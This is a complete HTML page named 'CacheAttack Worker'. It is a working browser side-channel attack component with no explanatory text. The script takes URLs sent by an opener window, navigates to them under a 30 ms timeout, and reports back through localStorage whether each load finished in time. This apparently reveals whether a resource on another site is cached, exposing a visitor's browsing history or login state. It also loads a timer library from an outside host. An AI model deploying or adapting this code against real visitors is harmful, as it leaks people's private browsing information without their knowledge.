<title>CacheAttack Worker</title>
<h1>CacheAttack Worker</h1>
<script src="https://ndev.tk/mirror/HackTimer/HackTimer.min.js"></script>
<script>
max = 30;

let state = window.localStorage.getItem("cache");
if(state !== null) window.opener.postMessage(state);
window.localStorage.removeItem("cache");

window.addEventListener("message", function(event) {  
  if(!event.data.startsWith("https://")) return
  localStorage.setItem("cache", true);
  setTimeout(_ => {
    localStorage.setItem("cache", false);
    window.location.reload();
  }, max);
  window.location = event.data;
});
</script>
